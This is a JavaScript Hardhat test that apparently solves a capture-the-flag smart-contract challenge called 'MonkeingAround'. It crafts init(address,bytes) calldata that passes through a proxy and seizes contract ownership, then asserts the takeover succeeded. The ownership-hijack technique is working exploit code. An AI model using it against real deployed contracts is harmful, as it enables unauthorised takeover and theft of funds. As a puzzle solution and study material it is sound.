const { ethers, network } = require("hardhat");
const { expect } = require("chai");
const cs = console.log;

describe("[AnotherPlease Exploit]", function () {
  let deployer, user1, challenge, exploit, proxy;

  before(async function () {
    [user1, deployer] = await ethers.getSigners();

    if (network.name == "hardhat") {
      const Challenge = await ethers.getContractFactory(
        "MonkeingAround",
        deployer
      );
      challenge = await Challenge.deploy();
    } else {
      challenge = await ethers.getContractAt(
        "MonkeingAround",
        "0x608bAAD421612F86dEB85B8Fd61081907D92689B"
      );
    }
    proxy = await ethers.getContractAt(
      "InitializableProxy",
      await challenge.allowlisted(0)
    );

    cs("user1 addr", user1.address);
  });

  it("exploit", async function () {
    const Exploit = await ethers.getContractFactory(
      "MonkeingAroundExploit",
      deployer
    );
    exploit = await Exploit.deploy();

    const initFunctionSignature = ethers.utils
      .id("init(address,bytes)")
      .slice(0, 10);
    const becomeOwnerSignature = ethers.utils.id("becomeOwner()").slice(0, 10);
    const initData = ethers.utils.defaultAbiCoder.encode(
      ["address", "bytes"],
      [exploit.address, becomeOwnerSignature]
    );
    const callData = initFunctionSignature + initData.slice(2);

    await challenge.doSomeMonkeMath(proxy.address, callData);

    cs("owner", await challenge.owner());
    expect(await challenge.owner()).to.equal(user1.address);
  });
});
